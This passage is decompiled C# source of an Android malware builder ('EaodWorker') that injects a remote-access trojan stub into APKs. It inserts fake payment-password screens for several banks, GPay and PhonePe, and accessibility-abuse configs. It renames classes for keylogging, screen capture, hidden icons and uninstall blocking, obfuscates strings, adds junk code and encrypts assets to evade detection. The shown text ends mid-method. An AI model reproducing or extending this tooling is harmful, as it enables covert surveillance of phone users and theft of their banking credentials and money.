using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Http;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Xml;
using System.Xml.Linq;
using EaodWorker.My.Resources;
using Ionic.Zip;
using Ionic.Zlib;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using Newtonsoft.Json;

namespace EaodWorker;

[StandardModule]
internal sealed class Worker
{
	public class SmaliFile
	{
		public string FilePath { get; set; }

		public string SourceRoot { get; set; }

		public SmaliFile(string filePath, string sourceRoot)
		{
			FilePath = filePath;
			SourceRoot = sourceRoot;
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__219_002D0
	{
		public string _0024VB_0024Local_sourceName;

		public _Closure_0024__219_002D0(_Closure_0024__219_002D0 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_sourceName = arg0._0024VB_0024Local_sourceName;
			}
		}

		[SpecialName]
		internal bool _Lambda_0024__1(XElement e)
		{
			return Operators.CompareString(e.Attribute("name").Value, _0024VB_0024Local_sourceName, TextCompare: false) == 0;
		}
	}

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("BackgroundWorker1")]
	private static BackgroundWorker _BackgroundWorker1;

	private static string Encrypt_Key = "Hf/I2[nt7b-^x6`[";

	private static string userid = null;

	private static string appid = null;

	private static string MYID = null;

	private static string ClientName = null;

	private static string UserHost = null;

	private static string Email = null;

	private static string use_access = null;

	private static string use_draw = null;

	private static string use_antkill = null;

	private static string use_atoprims = null;

	private static string notifytitle = null;

	private static string notifymsg = null;

	private static string MainActivity = null;

	private static string appdir = null;

	private static string userfolder = null;

	private static string ZIPPATH = null;

	private static string DropStub = null;

	private static string InjectStub = null;

	private static string apktemp = "";

	private static string apktoolpath = "";

	private static string Apksignerpath = "";

	private static string ApkZIPpath = "";

	private static string outputapk = "";

	private static string originalapkname = "";

	private static string Apkeditorpath = "";

	private static string extractorzip = "";

	private static bool protectfinished = false;

	public static bool Once = false;

	public static bool HoldMainThread = false;

	public static bool HoldFinishing = false;

	private static Process cmdProcess;

	public static string WorkingDir = "";

	private static bool FoundJava = false;

	private static string TheApkPath;

	public static bool need_externalstorage = false;

	public static bool need_write = false;

	public static bool need_battery = false;

	public static bool need_read = false;

	public static bool need_forground = false;

	public static bool need_syswinow = false;

	public static bool need_boot = false;

	public static bool need_all = false;

	public static string ASKPRIM_all;

	public static string ASKPRIM_black;

	public static string Buildtype;

	private static string N_AccessibilityActivity = "";

	private const string AccessibilityActivity = "AccessibilityActivity";

	private static string N_AccessServices = "";

	private const string AccessServices = "AccessServices";

	private static string N_HiddenBrowser = "";

	private const string HiddenBrowser = "HiddenBrowser";

	private static string N_AccessTools = "";

	private const string AccessTools = "AccessTools";

	private static string N_ActivityCaptureScreen = "";

	private const string ActivityCaptureScreen = "ActivityCaptureScreen";

	private static string NActivityMonitors = "";

	private const string ActivityMonitors = "ActivityMonitors";

	private static string N_update_app_ = "";

	private const string _update_app_ = "_update_app_";

	private static string N_Apps_Manage = "";

	private const string Apps_Manage = "Apps_Manage";

	private static string N_ClassGen = "";

	private const string ClassGen = "ClassGen";

	private static string N_AudioRecorder = "";

	private const string AudioRecorder = "AudioRecorder";

	private static string N_CameraCap = "";

	private const string CameraCap = "CameraCap";

	private static string N__ChatActivity_ = "";

	private const string ChatActivity = "ChatActivity";

	private static string N__Codes_ = "";

	private const string Codes = "Codes";

	private static string N__Consts_ = "";

	private const string Consts = "Consts";

	private static string N_Contct_manager = "";

	private const string Contct_manager = "Contct_manager";

	private static string N_ActivityDraw = "";

	private const string ActivityDraw = "ActivityDraw";

	private static string N_My_Configs = "";

	private const string My_Configs = "My_Configs";

	private static string N_My_Crpter = "";

	private const string My_Crpter = "My_Crpter";

	private static string N_Deviceinfo = "";

	private const string Deviceinfo = "Deviceinfo";

	private static string N_filesManager = "";

	private const string filesManager = "filesManager";

	private static string N_id_Commands = "";

	private const string id_Commands = "id_Commands";

	private static string N_KeyStorksQ = "";

	private const string KeyStorksQ = "KeyStorksQ";

	private static string N_LiveChat = "";

	private const string LiveChat = "LiveChat";

	private static string N_QueryChats = "";

	private const string QueryChats = "QueryChats";

	private static string N_LiveKeysStrok = "";

	private const string LiveKeysStrok = "LiveKeysStrok";

	private static string N_StarterServices = "";

	private const string StarterServices = "StarterServices";

	private static string N_LocationMonitor = "";

	private const string LocationMonitor = "LocationMonitor";

	private static string N_LockAppsActivity = "";

	private const string LockAppsActivity = "LockAppsActivity";

	private static string N_ActivMain = "";

	private const string ActivMain = "ActivMain";

	private static string N_MyLoger = "";

	private const string MyLoger = "MyLoger";

	private static string N_MyNotification = "";

	private const string MyNotification = "MyNotification";

	private static string N_MyPacket = "";

	private const string MyPacket = "MyPacket";

	private static string N_MySettings = "";

	private const string MySettings = "MySettings";

	private static string N_PermissionsActivity = "";

	private const string PermissionsActivity = "PermissionsActivity";

	private static string N_RecordPayPassWord = "";

	private const string RecordPayPassWord = "RecordPayPassWord";

	private static string N_RequestDraw = "";

	private const string RequestDraw = "RequestDraw";

	private static string N_MuteUninstall = "";

	private const string MuteUninstall = "MuteUninstall";

	private static string N_RequestPermissions2 = "";

	private const string RequestPermissions2 = "RequestPermissions2";

	private static string N_ScreenCaps = "";

	private const string ScreenCaps = "ScreenCaps";

	private static string N_ScreenReceiver = "";

	private const string ScreenReceiver = "ScreenReceiver";

	private static string N_StatusMonitor = "";

	private const string StatusMonitor = "StatusMonitor";

	private static string N_UtliTools = "";

	private const string UtliTools = "UtliTools";

	private static string N_NotifyListenService = "";

	private const string NotifyListenService = "NotifyListenService";

	private static string N_WorkServices = "";

	private const string WorkServices = "WorkServices";

	private static string N_BrodcastActivity = "";

	private const string BrodcastActivity = "BrodcastActivity";

	private static string N_OPPOAutostart = "";

	private const string OPPOAutostart = "OPPOAutostart";

	private static string N_RestrectionActivity = "";

	private const string RestrectionActivity = "RestrectionActivity";

	private static string N_HiddenActivity = "";

	private const string HiddenActivity = "HiddenActivity";

	private static string N_AnUninstall = "";

	private const string AnUninstall = "AnUninstall ";

	private static string N_LockActivity = "";

	private const string LockActivity = "LockActivity";

	private static string N_EngineWorker = "";

	private const string EngineWorker = "EngineWorker";

	private static string N_TransparentActivity = "";

	private const string TransparentActivity = "TransparentActivity";

	private static string N_TransparentLauncherAlias = "";

	private const string TransparentLauncherAlias = "TransparentLauncherAlias";

	private static string N_SIMLauncherAlias = "";

	private const string SIMLauncherAlias = "SIMLauncherAlias";

	private static string N_ChromeLauncherAlias = "";

	private const string ChromeLauncherAlias = "ChromeLauncherAlias";

	private static string N_OppoLauncherAlias = "";

	private const string OppoLauncherAlias = "OppoLauncherAlias";

	private static string N_VivoLauncherAlias = "";

	private const string VivoLauncherAlias = "VivoLauncherAlias";

	private static string N_MuteActivity = "";

	private const string MuteActivity = "MuteActivity";

	private static string N_AlertActivity = "";

	private const string AlertActivity = "AlertActivity";

	private static string N_HiddenIco = "";

	private const string HiddenIco = "HiddenIco";

	private static string N_WebBrowser = "";

	private const string WebBrowser = "WebBrowser";

	private static string N_Webjector = "";

	private const string Webjector = "Webjector";

	private static string AssetsPass;

	private static List<string> ALLPRIMSLIST = new List<string>();

	private static string NEWRANDOM = "";

	private static string newpkg = "";

	private static string newpkg_insmali = "";

	private static string oldpkg = "com.icontrol.protector";

	private static string oldpkg_insmali = "Lcom/icontrol/protector";

	private static string drop_newpkg = "";

	private static string drop_newpkg_insmali = "";

	private static string drop_oldpkg = "com.appd.instll";

	private static string drop_oldpkg_insmali = "Lcom/appd/instll";

	private static readonly string accesstagdata = "accessibilityprivatesrcapp";

	private static string accesstagdata_New = "";

	private static Dictionary<string, string> Obfucated = new Dictionary<string, string>();

	private static List<string> To_Obfucate = new List<string>
	{
		"URL_PING", "URL_MSG", "URL_SOCKT", "getIPAddress", "USR_MAIL", "USR_HOST", "SPLIT_SKT", "SPLIT_DATA", "SPLIT_LINE", "SPLIT_ARAY",
		"USR_NAME", "DEVICE_ID", "Rec_Activitys", "Rec_Notifications", "Rec_keystrokes", "Rec_links", "Rec_apps", "THE_IDF", "LIVE_KLOG", "localip",
		"SERVER_DIR", "get_prims", "get_draw", "get_kill", "get_click", "Draws_overs", "User_allPrims", "HOME_NAME", "Use_Access", "Anti_Kill",
		"Click_Prim", "Auto_Clicker", "Auto_Prims", "Send_Skilton", "Skeleton_Color", "Black_Screen", "Auto_Sreen", "Stored_resultCode", "Stored_intentdata", "_Notfy_TITL_",
		"_Notfy_MSG_", "Tracking_Data_str", "Notifi_ID", "My_Access_inst", "STATUS_MONITOR", "LOCK_SERVS", "PAKET_LOCK", "MY_COMMANDS_LIST", "EMIL_POST", "PHONE_POST",
		"TYPE_POST", "CUZ_POST", "DATA_POST", "Fix_it", "Get_Network", "Create_DevicID", "IsIgnore_Battery", "Time_Stamp", "Accessibility_Service", "Read_Contacts",
		"Read_SMS", "Read_Call_Log", "Acc_Camera", "Get_Accounts", "Record_Audio", "Call_Phone", "Call_Record", "Dcrpt_KET", "Dcrypt_datas", "Send_SMS",
		"Set_Wallpaper", "Doze_Mode", "Draw_Overlays", "Package_Installs", "is_Access_Enabled", "Battery_state", "TempPassLock", "Blocked_Apps", "Lock_App_list", "Supported_Browsers",
		"Dcrpt_Str", "Get_Cifr", "get_accss", "Gnrat_Ky", "Mob_Name", "Access_type", "Hide_ico", "auto_start", "auto_battery", "get_btry",
		"get_start", "Anti_emulator", "get_emu", "get_hideit", "get_accsstype", "Hide_Type", "get_hideentype", "Capture_Lock", "AsstsKey", "get_caplock",
		"Is_Store", "get_storemod", "Anti_Doze", "get_dozestate", "URL_CASH"
	};

	private static string[] ResoursIds = new string[34]
	{
		"0x7f0d001c", "0x7f070066", "0x7f070067", "0x7f070068", "0x7f07006e", "0x7f070089", "0x7f070096", "0x7f070098", "0x7f070099", "0x7f07009a",
		"0x7f07009b", "0x7f07009c", "0x7f07009d", "0x7f100000", "0x7f100002", "0x7f100001", "0x7f100003", "0x7f0b001c", "0x7f0b0060", "0x7f0b0059",
		"0x7f0b0058", "0x7f0b0074", "0x7f080006", "0x7f08005a", "0x7f080061", "0x7f080062", "0x7f080070", "0x7f080089", "0x7f0800e8", "0x7f080112",
		"0x7f080114", "0x7f08012b", "0x7f080141", "0x7f080150"
	};

	private static string spl_arguments = "[x0b0x]";

	private static string appname = "";

	private static string appversion = "";

	private static string appicopath = "";

	private static string appurl = "";

	private static string logintitle = "";

	private static string logindis = "";

	private static string loginbtn = "";

	private static string lngshort = "";

	private static string open_access = "";

	private static string descr_iption = "";

	private static string diao_type = "";

	private static string hiddenapp = "";

	private static string noemulator = "";

	private static string installtype = "";

	private static string hidetype = "";

	private static bool IsCustomeApp = false;

	private static string ServerApi = "http://localhost/private/Eaod90061.php";

	private static string ServerApi_Customapp = "http://localhost/private/Eaod91370.php";

	private static string onbuild = "onbuild";

	private static string failed = "failed";

	private static string finished = "finished";

	private static string IsStoreMod = "0";

	private static string C = "";

	private static string K = "";

	private static bool Waitprotect = true;

	private static bool Waitbuild = true;

	private static bool fordroper = false;

	private static string ClassGen1 = "BroReceiver";

	private static string ClassGen2 = "ConfirmDialog";

	private static string ClassGen3 = "MainActivity";

	private static string ClassGen4 = "SecoundActivity";

	private static string ClassGen5 = "SessionManager";

	private static string N_Class1 = "";

	private static string N_Class2 = "";

	private static string N_Class3 = "";

	private static string N_Class4 = "";

	private static string N_Class5 = "";

	private static string stubicon = "";

	private static string MainfistPath = "";

	private static string stringspath = "";

	private static string TargetAPKPATH = "";

	private static string TargetApkicon = "";

	private static string WorkDIR;

	private static string outputpath = "";

	private static string buildapkpath = "";

	private static string STUBPATH = "";

	private static string BASEPATH = "";

	private static string assetspath = "";

	private static string ClassesPath = "";

	private static Random randCompnts;

	private static readonly RandomNumberGenerator rng = RandomNumberGenerator.Create();

	private static readonly char[] chars = "qazwsxedcrfvtgbyhnujmikolp".ToCharArray();

	private static Random Rndomizid;

	internal static BackgroundWorker BackgroundWorker1
	{
		[CompilerGenerated]
		get
		{
			return _BackgroundWorker1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = BackgroundWorker1_DoWork;
			BackgroundWorker backgroundWorker = _BackgroundWorker1;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
			}
			_BackgroundWorker1 = value;
			backgroundWorker = _BackgroundWorker1;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
			}
		}
	}

	[STAThread]
	public static void Main(string[] args)
	{
		try
		{
			MYID = EaodWorker.Codes.FromBase64(args[0]);
			SignMe(MYID, Process.GetCurrentProcess().Id.ToString());
			Thread.Sleep(5000);
			Crypters crypters = Crypters.Create();
			appid = EaodWorker.Codes.FromBase64(args[1]);
			userid = EaodWorker.Codes.FromBase64(args[2]);
			ClientName = EaodWorker.Codes.FromBase64(args[3]);
			Email = crypters.Encrypt(EaodWorker.Codes.FromBase64(args[4]));
			MainActivity = EaodWorker.Codes.FromBase64(args[5]);
			appdir = EaodWorker.Codes.FromBase64(args[6]);
			UserHost = EaodWorker.Codes.FromBase64(args[7]);
			use_access = EaodWorker.Codes.FromBase64(args[8]);
			use_antkill = EaodWorker.Codes.FromBase64(args[9]);
			use_atoprims = EaodWorker.Codes.FromBase64(args[10]);
			notifytitle = EaodWorker.Codes.FromBase64(args[11]).Replace("\"", "'").Replace("\\", "\\\\");
			notifymsg = EaodWorker.Codes.FromBase64(args[12]);
			ASKPRIM_all = EaodWorker.Codes.FromBase64(args[13]);
			ASKPRIM_black = EaodWorker.Codes.FromBase64(args[14]);
			Buildtype = EaodWorker.Codes.FromBase64(args[15]);
			string currentDirectory = Directory.GetCurrentDirectory();
			string directoryName = Path.GetDirectoryName(currentDirectory);
			string text = directoryName + "\\" + appdir;
			userfolder = directoryName + "\\user\\apps\\" + userid + "\\" + appid;
			DropStub = directoryName + "\\private\\apkstub\\dropstub.zip";
			InjectStub = directoryName + "\\private\\apkstub\\jectstub.zip";
			if (!Directory.Exists(userfolder))
			{
				Directory.CreateDirectory(userfolder);
			}
			HoldFinishing = true;
			string buildtype = Buildtype;
			if (Operators.CompareString(buildtype, "S", TextCompare: false) != 0)
			{
				if (Operators.CompareString(buildtype, "C", TextCompare: false) == 0)
				{
					IsStoreMod = "0";
					appname = EaodWorker.Codes.FixStrings(EaodWorker.Codes.FromBase64(args[16]));
					appversion = EaodWorker.Codes.FromBase64(args[17]);
					appicopath = EaodWorker.Codes.FromBase64(args[18]);
					appurl = crypters.Encrypt(EaodWorker.Codes.FromBase64(args[19]));
					logintitle = EaodWorker.Codes.FromBase64(args[20]);
					logindis = EaodWorker.Codes.FromBase64(args[21]);
					loginbtn = EaodWorker.Codes.FromBase64(args[22]);
					lngshort = EaodWorker.Codes.FromBase64(args[23]);
					hiddenapp = EaodWorker.Codes.FromBase64(args[24]);
					noemulator = EaodWorker.Codes.FromBase64(args[25]);
					installtype = EaodWorker.Codes.FromBase64(args[26]);
					hidetype = EaodWorker.Codes.FromBase64(args[27]);
					use_draw = EaodWorker.Codes.FromBase64(args[28]);
					open_access = EaodWorker.Codes.FromBase64(args[29]);
					descr_iption = EaodWorker.Codes.FromBase64(args[30]);
					diao_type = EaodWorker.Codes.FromBase64(args[31]);
					if (Operators.CompareString(ASKPRIM_all, "1", TextCompare: false) == 0)
					{
						ZIPPATH = directoryName + "\\private\\apkstub\\apkstub.zip";
					}
					else
					{
						ZIPPATH = directoryName + "\\private\\apkstub\\apkstubg.zip";
					}
					TargetApkicon = directoryName + "\\user\\storage\\" + userid + "\\icons\\" + appicopath;
					if (!File.Exists(TargetApkicon))
					{
						Console.WriteLine("> Worker: Error");
						Mylogger.Logbuild(userid, "Worker Error");
						UpdateState(failed);
						singout(MYID);
						Environment.Exit(0);
					}
					IsCustomeApp = true;
					InsertApp();
				}
				else
				{
					Console.WriteLine("> Worker: Error 3");
					singout(MYID);
					Environment.Exit(0);
				}
			}
			else
			{
				IsCustomeApp = false;
				IsStoreMod = "1";
				ZIPPATH = directoryName + "\\" + appdir + "\\" + appid + ".zip";
				TargetApkicon = directoryName + "\\" + appdir + "\\ico.png";
				appname = EaodWorker.Codes.FixStrings(EaodWorker.Codes.FromBase64(args[16]));
				appversion = EaodWorker.Codes.FromBase64(args[17]);
				appicopath = EaodWorker.Codes.FromBase64(args[18]);
				appurl = crypters.Encrypt(EaodWorker.Codes.FromBase64(args[19]));
				logintitle = EaodWorker.Codes.FromBase64(args[20]);
				logindis = EaodWorker.Codes.FromBase64(args[21]);
				loginbtn = EaodWorker.Codes.FromBase64(args[22]);
				lngshort = EaodWorker.Codes.FromBase64(args[23]);
				hiddenapp = EaodWorker.Codes.FromBase64(args[24]);
				noemulator = EaodWorker.Codes.FromBase64(args[25]);
				installtype = EaodWorker.Codes.FromBase64(args[26]);
				hidetype = EaodWorker.Codes.FromBase64(args[27]);
				use_draw = EaodWorker.Codes.FromBase64(args[28]);
				open_access = EaodWorker.Codes.FromBase64(args[29]);
				descr_iption = EaodWorker.Codes.FromBase64(args[30]);
				diao_type = EaodWorker.Codes.FromBase64(args[31]);
			}
			Mylogger.Logbuild(userid, "WORKER 参数初始化完成:\r\nMYID: " + MYID + "\r\nAppid: " + appid + "\r\nUserid: " + userid + "\r\nClientName: " + ClientName + "\r\nEmail: " + Email + "\r\nMainActivity: " + MainActivity + "\r\nAppdir: " + appdir + "\r\nUserHost: " + UserHost + "\r\nuse_access: " + use_access + "\r\nuse_antkill: " + use_antkill + "\r\nuse_atoprims: " + use_atoprims + "\r\nnotifytitle: " + notifytitle + "\r\nnotifymsg: " + notifymsg + "\r\nASKPRIM_all: " + ASKPRIM_all + "\r\nASKPRIM_black: " + ASKPRIM_black + "\r\nBuildtype: " + Buildtype + "\r\nappname: " + appname + "\r\nappversion: " + appversion + "\r\nappicopath: " + appicopath + "\r\nappurl: " + appurl + "\r\nlogintitle: " + logintitle + "\r\nlogindis: " + logindis + "\r\nloginbtn: " + loginbtn + "\r\nlngshort: " + lngshort + "\r\nhiddenapp: " + hiddenapp + "\r\nnoemulator: " + noemulator + "\r\ninstalltype: " + installtype + "\r\nhidetype: " + hidetype + "\r\nuse_draw: " + use_draw + "\r\nopen_access：" + open_access + "\r\ndescr_iption：" + descr_iption + "\r\ndiao_type：" + diao_type + "\r\nZIPPATH: " + ZIPPATH + "\r\nTargetApkicon: " + TargetApkicon + "\r\nDropStub: " + DropStub + "\r\nInjectStub: " + InjectStub + "\r\nuserfolder: " + userfolder);
			Step1();
			Step2();
			Step3();
			do
			{
				Thread.Sleep(1);
			}
			while (HoldFinishing);
			singout(MYID);
			Environment.Exit(0);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Console.WriteLine("> Worker: Error");
			Mylogger.LogError(userid, "Main worker", ex2.Message);
			UpdateState(failed);
			singout(MYID);
			ProjectData.ClearProjectError();
		}
	}

	private static void Step3()
	{
		string text = null;
		checked
		{
			if (IsCustomeApp)
			{
				Mylogger.Logbuild(userid, ">> Custom Step 3...");
				text = TheApkPath + "\\smali";
			}
			else
			{
				Mylogger.Logbuild(userid, ">> Inject Data To Apk...");
				try
				{
					int num = 2;
					do
					{
						if (!Directory.Exists(TheApkPath + "\\smali_classes" + num))
						{
							Directory.CreateDirectory(TheApkPath + "\\smali_classes" + num);
							Directory.CreateDirectory(TheApkPath + "\\smali_classes" + num + "\\com\\icontrol\\protector");
							text = TheApkPath + "\\smali_classes" + num;
							break;
						}
						num++;
					}
					while (num <= 16);
					if (text == null)
					{
						Directory.CreateDirectory(TheApkPath + "\\smali_classes2");
						Directory.CreateDirectory(TheApkPath + "\\smali_classes2\\com\\icontrol\\protector");
						text = TheApkPath + "\\smali_classes2";
					}
					if (!File.Exists(text + "\\data.zip"))
					{
						File.Copy(InjectStub, text + "\\data.zip");
					}
					System.IO.Compression.ZipFile.ExtractToDirectory(text + "\\data.zip", text);
					File.Delete(text + "\\data.zip");
					GenerateJunkSmaliFiles(text, 68);
					Thread.Sleep(1);
					if (!Directory.Exists(TheApkPath + "\\res\\xml"))
					{
						Directory.CreateDirectory(TheApkPath + "\\res\\xml");
					}
					File.WriteAllText(TheApkPath + "\\res\\xml\\accessibilityprivatesrcapp.xml", Resources.accessibilityprivatesrcapp);
					File.WriteAllText(TheApkPath + "\\res\\xml\\fileprovider1.xml", Resources.providerfile);
					File.WriteAllText(TheApkPath + "\\res\\xml\\network_security_config.xml", Resources.network_security_config);
					File.WriteAllText(TheApkPath + "\\res\\xml\\splits.xml", Resources.splits);
					File.WriteAllText(TheApkPath + "\\res\\layout\\oppobattery.xml", Resources.oppobattery);
					File.WriteAllText(TheApkPath + "\\res\\layout\\nointernet.xml", Resources.nointernet);
					File.WriteAllText(TheApkPath + "\\res\\layout\\mywebviewer.xml", Resources.mywebviewer);
					File.WriteAllText(TheApkPath + "\\res\\layout\\uninstall_activity.xml", Resources.uninstall);
					File.WriteAllText(TheApkPath + "\\res\\layout\\uninstall_activity.xml", Resources.uninstall_activity);
					File.WriteAllText(TheApkPath + "\\res\\layout\\activity_record_pay_a.xml", Resources.activity_record_pay_a);
					File.WriteAllText(TheApkPath + "\\res\\layout\\activity_record_pay_w.xml", Resources.activity_record_pay_w);
					File.WriteAllText(TheApkPath + "\\res\\layout\\activity_record_pay_yun.xml", Resources.activity_record_pay_yun);
					File.WriteAllText(TheApkPath + "\\res\\layout\\activity_record_pay_jian.xml", Resources.activity_record_pay_jian);
					File.WriteAllText(TheApkPath + "\\res\\layout\\activity_record_pay_you.xml", Resources.activity_record_pay_you);
					File.WriteAllText(TheApkPath + "\\res\\layout\\activity_record_pay_nong.xml", Resources.activity_record_pay_nong);
					File.WriteAllText(TheApkPath + "\\res\\layout\\activity_record_pay_zhong.xml", Resources.activity_record_pay_zhong);
					File.WriteAllText(TheApkPath + "\\res\\layout\\activity_record_pay_gong.xml", Resources.activity_record_pay_gong);
					File.WriteAllText(TheApkPath + "\\res\\layout\\activity_record_pay_zhao.xml", Resources.activity_record_pay_zhao);
					File.WriteAllText(TheApkPath + "\\res\\layout\\activity_record_pay_gpay.xml", Resources.activity_record_pay_gpay);
					File.WriteAllText(TheApkPath + "\\res\\layout\\activity_record_pay_phonepe.xml", Resources.activity_record_pay_phonepe);
					File.WriteAllText(TheApkPath + "\\res\\layout\\activity_record_pay_ana.xml", Resources.activity_record_pay_ana);
					UpdateApkSrcs();
					string text2 = TheApkPath + "\\res\\values\\public.xml";
					do
					{
						Thread.Sleep(100);
					}
					while (!File.Exists(text2) | EaodWorker.Codes.FileInUse(text2));
					Mylogger.Logbuild(userid, ">> Encoding public file...");
					string contents = File.ReadAllText(text2).Replace(accesstagdata, accesstagdata_New);
					File.WriteAllText(text2, contents);
					Mylogger.Logbuild(userid, ">> Copy Apk lib's...");
					string sourcePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "stublib", "unknown");
					string destinationPath = TheApkPath + "\\unknown";
					EaodWorker.Codes.CopyDirectoryContents(sourcePath, destinationPath);
					string sourcePath2 = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "stublib", "kotlin");
					string destinationPath2 = TheApkPath + "\\kotlin";
					EaodWorker.Codes.CopyDirectoryContents(sourcePath2, destinationPath2);
					string sourcePath3 = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "stublib", "assets");
					string text3 = Path.Combine(Path.GetTempPath(), "assets_temp_" + Guid.NewGuid().ToString());
					string destinationPath3 = TheApkPath + "\\assets";
					try
					{
						if (Directory.Exists(text3))
						{
							Directory.Delete(text3, recursive: true);
						}
						Directory.CreateDirectory(text3);
						EaodWorker.Codes.CopyDirectoryContents(sourcePath3, text3);
						Mylogger.Logbuild(userid, $"Encrypt Assets:{AssetsPass}");
						EncryptFolder(text3, AssetsPass);
						EaodWorker.Codes.CopyDirectoryContents(text3, destinationPath3);
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						Mylogger.Logbuild(userid, $"Encrypt Assets:{ex2.Message}");
						EaodWorker.Codes.CopyDirectoryContents(sourcePath3, destinationPath3);
						ProjectData.ClearProjectError();
					}
					if (Directory.Exists(text3))
					{
						try
						{
							Directory.Delete(text3, recursive: true);
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
					}
					string sourcePath4 = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "stublib", "lib");
					string destinationPath4 = TheApkPath + "\\lib";
					EaodWorker.Codes.CopyDirectoryContents(sourcePath4, destinationPath4);
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception ex4 = ex3;
					Mylogger.LogError(userid, "Step3", ex4.Message);
					ProjectData.ClearProjectError();
				}
			}
			try
			{
				Mylogger.Logbuild(userid, ">> Encryption...");
				string[] files = Directory.GetFiles(text + "\\com\\icontrol\\protector");
				NEWRANDOM = EaodWorker.Codes.madladstr();
				string[] array = files;
				foreach (string path in array)
				{
					string text4 = File.ReadAllText(path).Replace("AccessibilityActivity", N_AccessibilityActivity).Replace("AccessServices", N_AccessServices)
						.Replace("HiddenBrowser", N_HiddenBrowser)
						.Replace("AccessTools", N_AccessTools)
						.Replace("ActivityCaptureScreen", N_ActivityCaptureScreen)
						.Replace("ActivityMonitors", NActivityMonitors)
						.Replace("_update_app_", N_update_app_)
						.Replace("Consts", N__Consts_)
						.Replace("Codes", N__Codes_)
						.Replace("ChatActivity", N__ChatActivity_)
						.Replace("CameraCap", N_CameraCap)
						.Replace("Contct_manager", N_Contct_manager)
						.Replace("Deviceinfo", N_Deviceinfo)
						.Replace("filesManager", N_filesManager)
						.Replace("id_Commands", N_id_Commands)
						.Replace("KeyStorksQ", N_KeyStorksQ)
						.Replace("LiveChat", N_LiveChat)
						.Replace("QueryChats", N_QueryChats)
						.Replace("LiveKeysStrok", N_LiveKeysStrok)
						.Replace("StarterServices", N_StarterServices)
						.Replace("LocationMonitor", N_LocationMonitor)
						.Replace("LockAppsActivity", N_LockAppsActivity)
						.Replace("ActivMain", N_ActivMain)
						.Replace("MyLoger", N_MyLoger)
						.Replace("MyNotification", N_MyNotification)
						.Replace("MyPacket", N_MyPacket)
						.Replace("My_Configs", N_My_Configs)
						.Replace("ActivityDraw", N_ActivityDraw)
						.Replace("My_Crpter", N_My_Crpter)
						.Replace("MySettings", N_MySettings)
						.Replace("PermissionsActivity", N_PermissionsActivity)
						.Replace("RecordPayPassWord", N_RecordPayPassWord)
						.Replace("RequestDraw", N_RequestDraw)
						.Replace("MuteUninstall", N_MuteUninstall)
						.Replace("RequestPermissions2", N_RequestPermissions2)
						.Replace("ScreenCaps", N_ScreenCaps)
						.Replace("ScreenReceiver", N_ScreenReceiver)
						.Replace("StatusMonitor", N_StatusMonitor)
						.Replace("UtliTools", N_UtliTools)
						.Replace("NotifyListenService", N_NotifyListenService)
						.Replace("WorkServices", N_WorkServices)
						.Replace("HiddenActivity", N_HiddenActivity)
						.Replace("LockActivity", N_LockActivity)
						.Replace("RestrectionActivity", N_RestrectionActivity)
						.Replace("OPPOAutostart", N_OPPOAutostart)
						.Replace("BrodcastActivity", N_BrodcastActivity)
						.Replace("AnUninstall ", N_AnUninstall)
						.Replace("TransparentActivity", N_TransparentActivity)
						.Replace("EngineWorker", N_EngineWorker)
						.Replace("TransparentLauncherAlias", N_TransparentLauncherAlias)
						.Replace("SIMLauncherAlias", N_SIMLauncherAlias)
						.Replace("ChromeLauncherAlias", N_ChromeLauncherAlias)
						.Replace("VivoLauncherAlias", N_VivoLauncherAlias)
						.Replace("OppoLauncherAlias", N_OppoLauncherAlias)
						.Replace("MuteActivity", N_MuteActivity)
						.Replace("AlertActivity", N_AlertActivity)
						.Replace("HiddenIco", N_HiddenIco)
						.Replace("WebBrowser", N_WebBrowser)
						.Replace("Webjector", N_Webjector)
						.Replace("ClassGen", N_ClassGen)
						.Replace("[USER_MAIL]", Email)
						.Replace("[USE-SUPER]", use_access)
						.Replace("[USER_DOM]", UserHost)
						.Replace("[USE-NOKILL]", use_antkill)
						.Replace("[USE-DRAWOVER]", use_draw)
						.Replace("[USE-AUTOGRANT]", use_atoprims)
						.Replace("[USE-ALLPRIM]", ASKPRIM_all)
						.Replace("[USE-BLACK]", ASKPRIM_black)
						.Replace("[USE-HIDDEEN]", hiddenapp)
						.Replace("[USE-STORE]", IsStoreMod)
						.Replace("[USE-GUID]", installtype)
						.Replace("[AST-PAS]", AssetsPass)
						.Replace("[USE-FAKE]", hidetype)
						.Replace("[Client_N]", ClientName)
						.Replace("[_NOTIFI_TITLE_]", notifytitle)
						.Replace("[_NOTIFI_MSG_]", notifymsg)
						.Replace("[OBFS]", NEWRANDOM)
						.Replace("[BSE_URL]", appurl)
						.Replace("[log-title]", logintitle)
						.Replace("[log-dis]", logindis)
						.Replace("[log-btn]", loginbtn)
						.Replace("[log-lng]", lngshort)
						.Replace("[USE-OOENACC]", open_access)
						.Replace("[USE-DIAO]", diao_type)
						.Replace("AudioRecorder", N_AudioRecorder)
						.Replace(drop_oldpkg, drop_newpkg)
						.Replace(oldpkg, newpkg)
						.Replace(oldpkg_insmali, newpkg_insmali)
						.Replace("Apps_Manage", N_Apps_Manage);
					foreach (string item in To_Obfucate)
					{
						text4 = text4.Replace(item, Obfucated[item]);
					}
					File.WriteAllText(path, text4);
					Thread.Sleep(1);
				}
				Mylogger.Logbuild(userid, ">> Encryption ALL...");
